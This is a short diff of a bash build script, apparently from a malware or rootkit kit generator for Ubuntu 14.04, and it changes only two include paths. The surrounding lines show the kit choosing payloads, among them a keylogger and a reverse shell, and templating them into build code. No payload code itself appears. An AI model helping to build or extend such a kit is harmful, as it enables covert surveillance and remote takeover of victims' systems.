@@ -1,7 +1,7 @@
 #!/bin/bash
 
 #some config variables, e.g. file names
-source kit/config_common.sh
+source kitgen/kitgen/config_common.sh
 
 #based upon chosen payloads, basic code build may slightly differ
 PAYLOAD_KEYLOGGER=0
@@ -36,7 +36,7 @@ if [ $PAYLOAD_REV_SHELL -gt 0 ]; then
   payloadfiles+=("\"\/$BASH_PAYLOAD_SHELL\"")
 fi
 
-code=`cat kit/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_code.sh`
+code=`cat kitgen/kitgen/ubuntu_14.04_x86_64/ubuntu_14.04_x86_64_code.sh`
 filelist=`echo "${files[@]}"`
 payloadfilelist=`echo "${payloadfiles[@]}"`
 sedexpr="s/FILELIST/$filelist/g"
